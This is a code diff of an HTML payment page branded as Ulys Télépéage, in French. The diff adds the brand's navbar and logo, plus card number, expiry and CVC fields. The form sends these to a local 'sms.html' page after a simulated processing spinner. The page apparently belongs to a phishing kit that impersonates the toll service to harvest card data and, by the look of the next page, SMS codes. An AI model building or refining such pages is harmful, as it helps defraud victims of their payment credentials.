@@ -5,55 +5,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Paiement – Ulys Télépéage</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
-  <style>
-    /* Spinner overlay */
-    #spinnerOverlay {
-      display: none;                /* caché par défaut */
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.6);
-      align-items: center;
-      justify-content: center;
-      z-index: 10000;
-      display: flex;                /* on laisse flex ici, on masque via JS */
-    }
-    #spinnerOverlay.hidden {
-      display: none;                /* classe utilitaire pour masquer */
-    }
-    .spinner {
-      width: 80px;
-      height: 80px;
-      border: 10px solid rgba(255,255,255,0.2);
-      border-top: 10px solid #ff8000; /* accent Ulys */
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    /* Centre le footer */
-    footer {
-      text-align: center !important;
-    }
-  </style>
 </head>
 <body>
-  <!-- votre bandeau, navbar, etc. -->
-  <div class="top-nav">…</div>
-  <div class="site-nav">…</div>
+  <!-- BANDEAU HAUT BLANC -->
+  <div class="top-nav">
+    <a href="#"><span>👤</span> Mon espace</a>
+    <a href="#" class="btn-primary">Devenir client</a>
+    <div class="lang">FR ▼</div>
+  </div>
+
+  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <div class="site-nav">
+    <nav class="navbar">
+      <div class="navbar-left">
+        <a href="index.html" class="logo-container">
+          <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo"/>
+        </a>
+        <div class="header-toggle">
+          <button class="toggle active">Particulier</button>
+          <button class="toggle">Professionnel</button>
+        </div>
+      </div>
+      <ul class="nav-links">
+        <li><a href="#">Télépéage</a></li>
+        <li><a href="#">Recharge électrique</a></li>
+        <li><a href="#">Parking</a></li>
+        <li><a href="#">Aide</a></li>
+      </ul>
+    </nav>
+  </div>
 
   <main class="container">
     <div class="card">
       <h1>Paiement sécurisé</h1>
       <form id="paymentForm" action="sms.html" method="get">
-        <!-- vos champs CB -->
+        <label for="cb-num">Numéro de carte</label>
+        <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
+
+        <label for="cb-date">Expiration</label>
+        <input type="month" id="cb-date" name="cb-date" required/>
+
+        <label for="cb-cvc">CVC</label>
+        <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" placeholder="123" required/>
+
         <button type="submit" class="btn">Valider le paiement</button>
       </form>
     </div>
   </main>
 
-  <!-- Spinner overlay (ajouté ici) -->
-  <div id="spinnerOverlay" class="hidden">
+  <!-- Spinner overlay -->
+  <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
 
@@ -62,17 +63,14 @@
   </footer>
 
   <script>
-    const form = document.getElementById("paymentForm");
-    const overlay = document.getElementById("spinnerOverlay");
-
-    form.addEventListener("submit", function(e) {
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
       // Affiche le spinner
-      overlay.classList.remove("hidden");
-      // Attendre 13 secondes avant de poursuivre
+      document.getElementById("spinnerOverlay").style.display = "flex";
+      // Simulation de traitement avant redirection
       setTimeout(() => {
         this.submit(); // ou window.location.href = "sms.html";
-      }, 13000);
+      }, 2000);
     });
   </script>
 </body>
